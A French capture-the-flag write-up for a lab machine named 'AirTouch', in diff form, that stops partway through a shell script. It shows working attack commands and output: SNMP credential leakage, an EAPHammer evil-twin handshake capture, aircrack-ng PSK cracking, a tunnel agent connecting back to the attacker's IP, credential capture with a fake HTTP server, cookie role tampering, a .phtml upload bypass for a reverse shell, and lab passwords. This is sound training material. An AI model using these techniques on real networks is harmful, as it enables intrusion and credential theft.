@@ -1,0 +1,754 @@
+nmap et là c'est vraiment chelou
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ nmap -p- -sV 10.129.244.98
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 05:36 -0500
+Nmap scan report for 10.129.244.98
+Host is up (0.018s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
+
+il y a que le port ssh d'ouvert ?
+je scan les port udp aussi ducoup, je me dis que vu que le nom du challenge est "AirTouch" ça a un rapport avec la technologie AirDrop ou un truc comme ça, peut etre que c'est une techno qui marche via UDP que je dois exploiter
+
+en attendant je regarde dans mes anciens writeups et je trouves que je tombes rarement sur cette version de ubuntu/ssh (img: sc/previous.jpg) je vais donc chercher des CVE
+j'ai pas trouvé grand chose.
+
+scan udp terminé:
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ nmap -sU 10.129.244.98 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 05:52 -0500
+Stats: 0:03:28 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 21.02% done; ETC: 06:09 (0:12:58 remaining)
+Stats: 0:03:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 21.12% done; ETC: 06:09 (0:12:57 remaining)
+Nmap scan report for 10.129.244.98
+Host is up (0.021s latency).
+Not shown: 998 closed udp ports (port-unreach)
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 1040.99 seconds
+
+le serveur snmp peut me permettre de récupérer des informations
+
+dedans je tombes sur 
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ snmpwalk -v2c -c public 10.129.244.98   
+iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (543665) 1:30:36.65
+iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
+iso.3.6.1.2.1.1.6.0 = STRING: "\"Consultant pc\""
+iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+
+effectivement ça fonctionne consultant:RxBlZhLmOkacNWScmZ6D en ssh
+a l'interieur je trouves 2 images qui représentent le réseau de l'entreprise (img: sc/diagram-net.png) (img: sc/photo_2023-03-01_22-04-52.png)
+
+on a donc 3 réseaux (3 interfaces):
+- Le réseau du consultant avec le "consultant laptop" a l'ip 172.20.1.2 (et un nat qui redirige les connections ssh et snmp de l'exterieur vers lui)
+- un reseau "tablet vlan" SSID "AirTouch-Internet" avec tablet manager (des tablettes selon l'autre image) sur la range "192.168.3.0/24"
+- un reseau "Corp vlan" SSID "AirTouch-Office" avec les pc du bureau sue la range "10.10.10.0/24"
+
+Intéressant c'est l'une des premières box linux htb que je vois qui joue avec un systeme de réseaux
+j'aime bien pcq ça va me permettre de rejouer avec ligolo-ng (et j'aime bien ce truc)
+
+sur le pc du consultant j'ai tout les droits je peux me mettre en root, et pour le fun sans trop d'espoir je vais dans le dossier root et je trouves un dossier: epheammer
+
+le github du meme nom me dit
+"EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. It is designed to be used in full scope wireless assessments and red team engagements. As such, focus is placed on providing an easy-to-use interface that can be leveraged to execute powerful wireless attacks with minimal manual configuration. To illustrate just how fast this tool is, our Quick Start section provides an example of how to execute a credential stealing evil twin attack against a WPA/2-EAP network in just commands."
+
+bon bah tant mieux on va utiliser ces outils présents sur le pc si ils nous les conseillent
+
+notre but est donc de s'attacjer a des réseaux wifi
+j'active le wifi du laptop et je regarde ce qui est dispo
+
+root@AirTouch-Consultant:~/eaphammer# ip link set wlan0 up
+
+root@AirTouch-Consultant:~/eaphammer# sudo iwlist wlan0 scan | grep ESSID
+                    ESSID:"vodafoneFB6N"
+                    ESSID:"MOVISTAR_FG68"
+                    ESSID:"WIFI-JOHN"
+                    ESSID:"AirTouch-Internet"
+                    ESSID:"MiFibra-24-D4VY"
+                    ESSID:"AirTouch-Office"
+                    ESSID:"AirTouch-Office"
+
+on a les différents réseaux listés sur l'image et d'autres comme WIFI-JOHN
+
+en lisant un article sur EPHammer je suis tombé sur cette ligne 
+
+Let's capture the packets from both 2.4 GHz and 5 GHz bands through the wlan0 interface using the following command.
+
+airodump-ng --band abg wlan0
+
+ça ressemble vachement a "airtouch" "airdump" et c'est pile dans le domaine qu'on nous demande d'exploiter, est-ce un indice ?
+
+en plus sur le laptop il y a déjà tout ces binaires
+root@AirTouch-Consultant:~/eaphammer# air
+airbase-ng              airdecap-ng             aireplay-ng             airodump-ng             airolib-ng              airtun-ng               
+aircrack-ng             airdecloak-ng           airmon-ng               airodump-ng-oui-update  airserv-ng              airventriloquist-ng
+
+en gros ce qu'il fait c'est de détecter si il y a des pc qui veulent se connecter a un wifi donc je fais faire pareil
+
+AirTouch-Office
+
+root@AirTouch-Consultant:~/eaphammer# ifconfig wlan0 down
+root@AirTouch-Consultant:~/eaphammer# iwconfig wlan0 mode monitor
+root@AirTouch-Consultant:~/eaphammer# ifconfig wlan0 up
+root@AirTouch-Consultant:~/eaphammer# iwconfig wlan0
+wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+root@AirTouch-Consultant:~/eaphammer# airodump-ng --band abg wlan0
+
+ CH  6 ][ Elapsed: 48 s ][ 2026-02-25 14:08
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ AC:8B:A9:F3:A1:13  -28       14        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office
+ AC:8B:A9:AA:3F:D2  -28       14        1    0  44   54e  WPA2 CCMP   MGT  AirTouch-Office  
+ F0:9F:C2:A3:F1:A7  -28        9        2    0   6   54        CCMP   PSK  AirTouch-Internet
+ 62:0A:CE:FB:AE:CA  -28        9        0    0   6   54        CCMP   PSK  WIFI-JOHN
+ 4A:AD:73:19:0F:86  -28        9        0    0   9   54   WPA2 CCMP   PSK  MiFibra-24-D4VY
+ A2:69:DF:2E:F4:5B  -28       20        0    0   3   54        CCMP   PSK  MOVISTAR_FG68
+ 6A:E7:69:68:41:5A  -28      482        0    0   1   54        TKIP   PSK  vodafoneFB6N
+  
+ BSSID      STATION    PWR   Rate    Lost    Frames  Notes  Probes 
+  
+ (not associated)   28:6C:07:12:EE:F3  -29    0 - 1      0        2 AirTouch-Office 
+ (not associated)   28:6C:07:12:EE:A1  -29    0 - 1      0        2 AirTouch-Office 
+ AC:8B:A9:F3:A1:13  C8:8A:9A:6F:F9:D2  -29    0 -24e     0        5 AirTouch-Office,AccessLink        
+
+superrrr article pour comprendre ces histoires de wifi
+https://virtualsamuraii.github.io/network/retex-pentest-wifi-wpa2-enterprise/
+
+
+bon j'ai appris beaucoup sur le fonctionnement du wifi, sur le EAP ou le PSK etc...
+en gros moi j'ai un reseau qui utilise wpa_eap pour les entreprises, et qui en gros utilise un serveur d'authentification RADIUS, au lieu d'avoir une clef PSK pour tout le monde il demande un mdp/user qu'il vérifie grace a un challenge, il y a plusieurs version de protocole pour la verification d'identité et on peut tenter de forcer le downgrade pour aller vers des versions plus fragiles
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --interface wlan1 --channel 44 --essid AirTouch-Office --bssid AC:8B:A9:AA:3F:D2 --auth wpa-eap --creds --negotiate gtc-downgrade
+
+bon moi j'ai toujours rien, peut etre que c'est une question de certificats jsp il faudrait que j'accede aux données avec wireshark mais meme ça il m'autorise pas
+
+a un moment je suis persuadé d'avoir vu une tentative de connexion a airtouch-internet
+
+avec airdump je récupère cette identité qui essaie beaucoup de se connecter AirTouch\r4ulcl
+
+dans un autre packets je vois countrycode ES pour Airtouch-office
+
+Avec l'adresse mac dans les packets je vois que le routeur est "ubiquiti" je recherche vaguement des CVE
+
+https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
+
+J'ai appris encore des tonnes de trucs sur ça je vois qu'il y a des possibilités de relay
+https://www.synacktiv.com/publications/wireless-infidelity-pentest-wi-fi-en-2025
+
+Bon après une bonne journée de travail j'avance pas trop, j'ai l'impression que le problème se situe vraiment avec 
+SSL: SSL3 alert: read (remote end reported an error):fatal:unknown CA
+OpenSSL: openssl_handshake - SSL_connect error:14094418:SSL routines:ssl3_read_bytes:tlsv1 alert unknown ca
+
+mais je sais pas si ça veut dire aue le pc qui veut se co vérifie bien le CA et le refuse ou alors si c'est moi qui ait mal config un truc, bon au moins j'en apprends vraiment beaucoup et j'ai un nom d'utilisateur, a demain !
+
+une page sur internet m'informe que c'est bien ce que je pensais le pc qui se connecte vérifie que le contrat soit le bon, le message d'erreur veut dire ça
+https://pwn.no0.be/exploitation/wifi/wpa_enterprise/
+
+ça me semble logique finalemet que sur les deux réseaux qu'il faut que j'exploite celui des "computers" soit mieux setup que celui des tablettes, meme dans l'image qu'ils nous ont donner les réseaux a hacker sont surement dans l'ordre donc ajd je me concentre sur l'autre réseau "AirTouch-Internet", j'avais déjà détecté une tentative de connection, je vais tenter de la recapter pour avoir une adresse mac et tenter de relancer mon attaque
+
+
+ F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29    1 -54      0       31
+
+bssid de AirtouchInternet F0:9F:C2:A3:F1:A7 et 28:6C:07:FE:A3:22 a essayé de se co (il faut savoir que c'est un wpa-PSK cette fois)
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --interface wlan1 --channel 6 --essid AirTouch-Internet --bssid F0:9F:C2:A3:F1:A7 --auth wpa-psk --creds
+
+                     .__                                          
+  ____ _____  ______ |  |__ _____    _____   _____   ___________  
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \ 
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/ 
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|    
+     \/     \/|__|        \/     \/      \/      \/     \/        
+
+
+                        Now with more fast travel than a next-gen Bethesda game. >:D                              
+
+                             Version:  1.14.0                     
+                            Codename:  Final Frontier             
+                              Author:  @s0lst1c3                  
+                             Contact:  gabriel<<at>>transmitengage.com   
+
+
+[?] Am I root?                                                    
+[*] Checking for rootness...                                      
+[*] I AM ROOOOOOOOOOOOT                                           
+[*] Root privs confirmed! 8D                                      
+[*] Saving current iptables configuration...                      
+[*] Reticulating radio frequency splines...                       
+Error: Could not create NMClient object: Could not connect: No such file or directory.                            
+
+[*] Using nmcli to tell NetworkManager not to manage wlan1...     
+
+100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]
+
+[*] Success: wlan1 no longer controlled by NetworkManager.        
+[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-02-27-12-02-18-IZ4yQIQlnH5CfX8kUY2UMbsmtVCBK0Jc.hccapx                
+
+[hostapd] AP starting...                                          
+
+Configuration file: /root/eaphammer/tmp/hostapd-2026-02-27-12-02-18-hJdUi3JNrXHWFIJxcEloOeIqiZkjwcJo.conf
+rfkill: Cannot open RFKILL control device
+wlan1: interface state UNINITIALIZED->COUNTRY_UPDATE
+Using interface wlan1 with hwaddr f0:9f:c2:a3:f1:a7 and ssid "AirTouch-Internet"
+wlan1: interface state COUNTRY_UPDATE->ENABLED
+wlan1: AP-ENABLED 
+
+
+Press enter to quit...
+
+wlan1: STA 28:6c:07:fe:a3:22 IEEE 802.11: authenticated
+wlan1: STA 28:6c:07:fe:a3:22 IEEE 802.11: associated (aid 1)
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan1: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+
+
+j'ai meme pas besoin de tenter de le déco, je recoit le handshake et je tentes ensuite de dériver la clé PSK du handshake en local
+
+┌──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ aircrack-ng ./wpa_handshake_capture-2026-02-27-12-02-18-IZ4yQIQlnH5CfX8kUY2UMbsmtVCBK0Jc.hccapx -w /usr/share/wordlists/rockyou.txt 
+Reading packets, please wait...
+Opening ./wpa_handshake_capture-2026-02-27-12-02-18-IZ4yQIQlnH5CfX8kUY2UMbsmtVCBK0Jc.hccapx
+Read 62 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening ./wpa_handshake_capture-2026-02-27-12-02-18-IZ4yQIQlnH5CfX8kUY2UMbsmtVCBK0Jc.hccapx
+Read 62 packets.
+
+1 potential targets
+
+
+                               Aircrack-ng 1.7 
+
+      [00:00:01] 31658/10303727 keys tested (24069.66 k/s) 
+
+      Time left: 7 minutes, 6 seconds                            0.31%
+
+                           KEY FOUND! [ challenge ]
+
+
+      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0 
+                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 07 6C 44 AF FF EF 68 40 0D BB 23 72 12 96 C8 0C 
+
+trouvé ! la clé pour se co au réseau airTouch-Internet est challenge
+
+bon mtn il faut que j'arrive a me co mdrrr
+
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_passphrase "AirTouch-Internet" "challenge"
+network={
+        ssid="AirTouch-Internet"
+        #psk="challenge"
+        psk=d1ff702dcb1182eec9e189e1693555a007dc1b21be358e02b87574497dcf017e
+}
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/wpa.conf
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+root@AirTouch-Consultant:~/eaphammer/loot# dhclient wlan0
+root@AirTouch-Consultant:~/eaphammer/loot# ip addr show wlan0
+4: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.3.48/24 brd 192.168.3.255 scope global dynamic wlan0
+       valid_lft 86395sec preferred_lft 86395sec
+    inet6 fe80::4000:ff:fe00:0/64 scope link 
+       valid_lft forever preferred_lft forever
+
+parfait on est présent sur le réseau, on va le scan mtn pour voir ce qu'il y a dessus
+
+root@AirTouch-Consultant:~/eaphammer/loot# nmap -sn 192.168.3.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-27 12:32 UTC   
+Nmap scan report for 192.168.3.1                                  
+Host is up (0.00016s latency).                                    
+MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)                
+Nmap scan report for 192.168.3.48                                 
+Host is up.                                                       
+Nmap done: 256 IP addresses (2 hosts up) scanned in 26.02 seconds 
+
+on a donc juste 192.168.3.1 de présent (l'autre c'est moi mdr)
+
+root@AirTouch-Consultant:~/eaphammer/loot# nmap -p- -sV 192.168.3.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-27 12:37 UTC
+Nmap scan report for 192.168.3.1
+Host is up (0.000017s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  dnsmasq 2.90
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.02 seconds
+
+on a un petit port 80 d'ouvert on va voir ce qu'il y a dessus
+
+pour pouvoir ouvrir dans mon navigateur on va utiliser mon logiciel préféré ligolo-ng !
+
+sur le pc local:
+──(kali㉿kali)-[~/Documents/AirTouch]
+└─$ sudo ligolo-proxy -laddr 0.0.0.0:8001 -selfcert
+
+sur la machine:
+root@AirTouch-Consultant:/tmp# ./ligolo -connect:8001 10.10.14.2 -ignore-cert
+
+de retour chez moi je crée une interface:
+
+ligolo-ng » session 
+? Specify a session : 1 - root@AirTouch-Consultant - 10.129.6.116:49836 - 72912104c49b
+
+[Agent : root@AirTouch-Consultant] » interface_create --name "evil-cha"
+INFO[0660] Creating a new evil-cha interface...         
+INFO[0660] Interface created!                           
+
+je lance un tunnel via cette interface vers la machine victime
+[Agent : root@AirTouch-Consultant] » tunnel_start --tun evil-cha
+INFO[0681] Starting tunnel to root@AirTouch-Consultant (72912104c49b) 
+
+et je redirige les requetes vers 192.168.3.0/24 sur la bonne interface pour les réaliser sur le réseau distant
+
+[Agent : root@AirTouch-Consultant] » interface_add_route --name evil-cha --route 192.168.3.0/24
+
+voilà maintenant j'ai accès au site web du wifi distant, je tombes sur une page de login "PSK Router Login" où l'on me demande un login et password (img: sc/interface.jpg)
+
+j'avais eu un nom d'utilisateur (bon de pc mdr) la dernière fois en annalisant les paquets de connection avec airdump et wireshark,
+je retentes ça avec le reseau Airtouch-Internet
+root@AirTouch-Consultant:~# airodump-ng --channel 6 wlan1mon --output-format pcap --write /tmp
+
+mais bon je trouves rien cette fois (je crois que c'est que dans le wpa-eap)
+sinon j'ai d'autres nom:
+un wifi nommé
+WIFI-JOHN
+donc John
+
+sinon je me rapelle de l'histoire des CVE sur le routeur qu'on avait vu précédemment, si ça se trouves c'est l'interface du routeur qui était sensible
+
+je crois que je me suis fait ban en cherchant les paths avec feroxbuster mdr, jsp pk le tunnel marche plus
+bon dans ces cas là il faut juste supprimer l'interface et la refaire
+
+ce qui me gène c'est que j'ai que le routeur et pas le pc qui essayais de se connecter, je me dis que si j'intercepte le traffic je pourrais voir les logins vers l'interface, j'ai vu aussi que eapHammer pouvait setup un faux panel de connection (et c'est plus simple a faire pour l'instant donc je tentes)
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --create-template --name airtouch-internet --url http://192.168.3.1/login.php
+
+                     .__                                         
+  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
+     \/     \/|__|        \/     \/      \/      \/     \/       
+
+
+                        Now with more fast travel than a next-gen Bethesda game. >:D
+
+                             Version:  1.14.0
+                            Codename:  Final Frontier
+                              Author:  @s0lst1c3
+                             Contact:  gabriel<<at>>transmitengage.com
+
+    
+[?] Am I root?
+[*] Checking for rootness...
+[*] I AM ROOOOOOOOOOOOT
+[*] Root privs confirmed! 8D
+login
+download
+[*] Setting module name to airtouch-internet
+
+./eaphammer --interface wlan1 --channel 6 --essid AirTouch-Internet --bssid F0:9F:C2:A3:F1:A7 --auth wpa-psk --wpa-passphrase challenge --captive-portal -lport 80 --portal-template airtouch-internet
+
+./eaphammer --interface wlan1 --channel 6 --essid AirTouch-Internet --bssid F0:9F:C2:A3:F1:A7 --auth wpa-psk --wpa-passphrase challenge --captive-portal --lport 80 --portal-template airtouch-internet
+
+le probleme c'est que je suis dans un docker et je peux pas lancer le portail a cause de ça (j'ai une error)
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --interface wlan1 --channel 6 --essid AirTouch-Internet --bssid F0:9F:C2:A3:F1:A7 --auth wpa-psk --wpa-passphrase challenge --captive-portal --lport 80 --portal-template airtouch-internet
+
+                     .__                                         
+  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
+     \/     \/|__|        \/     \/      \/      \/     \/       
+
+
+                        Now with more fast travel than a next-gen Bethesda game. >:D
+
+                             Version:  1.14.0
+                            Codename:  Final Frontier
+                              Author:  @s0lst1c3
+                             Contact:  gabriel<<at>>transmitengage.com
+
+    
+[?] Am I root?
+[*] Checking for rootness...
+[*] I AM ROOOOOOOOOOOOT
+[*] Root privs confirmed! 8D
+[*] Saving current iptables configuration...
+Traceback (most recent call last):
+  File "./eaphammer", line 1203, in <module>
+    captive_portal()
+  File "./eaphammer", line 418, in captive_portal
+    utils.set_ipforward(1)
+  File "/root/eaphammer/core/utils.py", line 56, in set_ipforward
+    with open(settings.dict['core']['eaphammer']['general']['proc_ipforward'], 'w') as fd:
+OSError: [Errno 30] Read-only file system: '/proc/sys/net/ipv4/ip_forward'
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --captive-portal-server-only --lport 80 --lhost 0.0.0.0 --portal-template airtouch-internet
+
+
+j'ai réussis a faire en sorte de setup la fausse page d'identification et en meme temps lancer le serveur mais je penses que si je fais pas en sorte que mon faux serveur attribue les bonnes range d'ip bah il va pas trouver l'interface.
+j'ai galérer un peu avec ça mais je crois avoir trouver un blog qui parle de ça
+
+https://medium.com/@DbgMan/the-joy-of-wireless-all-you-need-about-evil-twin-attacks-part-2-9be0ad26764a
+
+en gros il utilise dnsmasq qui permet de setup un serveur dhcp qui va attribuer des ip a ceux qui se connectent et permettre d'attribuer une ip au routeur (le pc)
+
+je modifie sa propre config pour mettre la mienne
+
+interface=wlan1
+dhcp-range=192.168.3.2,192.168.3.254,255.255.255.0,10h
+dhcp-option=3,192.168.3.1
+dhcp-option=6,192.168.3.1
+server=8.8.4.4
+server=8.8.8.8
+listen-address=127.0.0.1
+address=/#/192.168.3.1
+log-dhcp
+log-queries
+
+ensuite je lance dnsmask 
+sudo dnsmasq -C dns.conf -d
+
+je setup la carte wlan1 pour gerer cette range d'ip
+
+sudo ifconfig wlan1 192.168.0.1/24
+
+je lance eapHammer pour faire le faux réseau:
+./eaphammer --interface wlan1 --channel 6 --essid AirTouch-Internet --bssid F0:9F:C2:A3:F1:A7 --auth wpa-psk --wpa-passphrase challenge
+
+et a coté je lance un serv python random (en vrai juste pour voir si je recoit des requetes (car le faux serv avec heaphammer etait chelou))
+
+et effectivement je recoit des trucs
+
+root@AirTouch-Consultant:~/eaphammer# python3 -m http.server 80                 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                        
+192.168.3.74 - - [01/Mar/2026 17:53:36] code 404, message File not found
+192.168.3.74 - - [01/Mar/2026 17:53:36] "GET /lab.php HTTP/1.1" 404 -
+192.168.3.74 - - [01/Mar/2026 17:53:36] code 501, message Unsupported method ('POST')
+192.168.3.74 - - [01/Mar/2026 17:53:36] "POST /login.php HTTP/1.1" 501 -
+
+le bot qui simule l'utilisateur envoie directement la requete post sur le login, je fais donc un simple script python qui va me les afficher
+
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print("\n--- NEW REQUEST ---")
+        print(self.requestline)
+        print(self.headers)
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length)
+
+        print("\n--- NEW REQUEST ---")
+        print(self.requestline)
+        print(self.headers)
+        print(body.decode(errors="ignore"))
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
+
+
+parfaiiit j'ai les mdp 192.168.3.1 - - [01/Mar/2026 18:36:42] "POST /login.php HTTP/1.1" 404 -
+
+--- NEW REQUEST ---
+POST /login.php HTTP/1.1
+Host: 192.168.3.1
+User-Agent: curl/7.88.1
+Accept: */*
+Accept-Encoding: deflate, gzip, br, zstd
+Cookie: PHPSESSID=1tfugpcfg00it2ok1cnlsnfp58; UserRole=user
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 58
+
+
+Username=manager&Password=2wLFYNh4TSTgA5sNgT4&Submit=Login
+192.168.3.228 - - [01/Mar/2026 18:36:46] "POST /login.php HTTP/1.1" 404 -
+
+manager:2wLFYNh4TSTgA5sNgT4
+
+j'undo mes trucs pour le fake hotspot
+sudo ifconfig wlan1 0.0.0.0
+
+et j'utilise mes nouveaux identifiants pour me connecter au pannel
+(img: sc/panel.jpg)
+j'arrive sur un pannel ou je peux modifier les settings d'un reseau nommé "wifi-mobiles", je peux changer le mdp, le nom du réseau, et le protocole (wpa-psk) MAIS ! je suis connecter en tant qu'user et donc je peux rien modif, mais je me souviens que dans la requete que j'avais intercepté il y avait ce cookie Cookie: PHPSESSID=1tfugpcfg00it2ok1cnlsnfp58; UserRole=user, si ça se trouve j'ai juste a changer le role dans le cookie.
+
+je l'ai changé en admin et ça m'a ouvert un nouveau champ "upload configuration file" en bas de la liste, je me dis que je peux peut etre upload un reverse shell en php 
+je me mange un 
+"Sorry, PHP and HTML files are not allowed.Sorry, your file was not uploaded."
+mdr bizarrement ça me dit que c'est le bon chemin, il faut juste que je trouves comment bypass
+
+le fait qu'il precise php et html me fait penser a l'extension phtml qui peut être utilisée desfois pour bypass les détections d'extensions (et etre interprétée quand même), et BINGO ! c'est upload et j'ai mon reverse shell (que j'ai pointé vers le pc du consultant), c'est drole le petit indice subliminal mdrrr
+
+
+dans /lab.php
+j'ai 
+Welcome manager
+
+
+
+Congratulation! You have logged into password protected page. Click here to go to index.php to get the flag.
+
+mais vraiment je vois pas où je suis censé trouver le flag
+
+le seul truc bizarre que je trouves pour l'instant c'est dans le login j'ai 
+
+if (isset($_POST['Submit'])) {                                                  
+  /* Define username, associated password, and user attribute array */          
+  $logins = array(
+    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
+    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')   
+  );
+
+c'est peut être un mdp a reutiliser sinon pourquoi le laisser en commentaires
+
+AirTouch\r4ulcl JunDRDZKHDnpkpDDvay
+
+cat > /tmp/wpa_eap.conf << EOF
+network={
+    ssid="AirTouch-Office"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="AirTouch\r4ulcl"
+    password="JunDRDZKHDnpkpDDvay"
+    phase2="auth=MSCHAPV2"
+}
+EOF
+
+non ça marche pas
+dans logout.phtml je retrouves le meme nom d'utilisateur que j'avais trouvé
+
+<h1>Welcome to a completely useless code!</h1>
+<p>by r4ulcl</p>
+<div id="egg">
+</user_defined/login/static/img/bigbrain.png" alt="Easter Egg" width="100%">
+
+et une path
+re regarder le code source de index
+
+la version de sudo sur le serveur est la 1.8.31 qui est très ancienne et vulnérable a CVE-2021-3156
+
+on peut se connecter en ssh avec user:JunDRDZKHDnpkpDDvay sur 192.168.3.1
+
+et j'ai acces a tout
+
+user@AirTouch-AP-PSK:~$ sudo su
+root@AirTouch-AP-PSK:/home/user# cd /root
+root@AirTouch-AP-PSK:~# ls
+certs-backup  cronAPs.sh  psk  send_certs.sh  start.sh  user.txt  wlan_config_aps
+root@AirTouch-AP-PSK:~# cat user.txt 
+2c349b9dac81e1176e34226b9910dde7
+
+et j'ai le user.txt dans le root ENFIN!
+
+ok bon on se retrouves avec beaucoup de fichiers différents, des certificats etc, les certifs me seront peut etre utiles pour le wpa-eap du dernier réseau, rappelez vous la dernière fois on avait pas pu y accèder car le pc qui tentait de se co verifiait les certificats
+
+je fais un copié collé de tout ça sur ma machine pour explorer ça solo et au cas où je perds la co/je fais ça un autre jour j'aurais pas besoin de me retaper toutes les étapes pour continuer
+
+effectivement dans le script send_certs.sh je vois que c'est bien les bons certificats pour le wifi AirTouch-office
+
+#!/bin/bash
+
+# DO NOT COPY
+# Script to sync certs-backup folder to AirTouch-office. 
+
+# Define variables
+REMOTE_USER="remote"
+REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
+REMOTE_PATH="~/certs-backup/"
